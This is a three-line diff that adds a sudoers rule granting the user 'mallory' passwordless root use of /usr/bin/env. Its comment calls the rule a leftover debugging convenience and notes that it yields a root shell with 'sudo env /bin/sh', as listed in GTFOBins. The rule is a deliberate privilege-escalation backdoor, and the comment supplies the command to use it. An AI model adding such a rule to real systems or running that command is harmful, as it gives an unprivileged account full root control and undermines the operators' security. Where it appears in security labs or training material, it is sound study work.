@@ -1,0 +1,3 @@
+# Operator convenience rule left over from a debugging session. Running env as
+# root is enough to spawn a root shell (GTFOBins: sudo env /bin/sh).
+mallory ALL=(ALL) NOPASSWD: /usr/bin/env
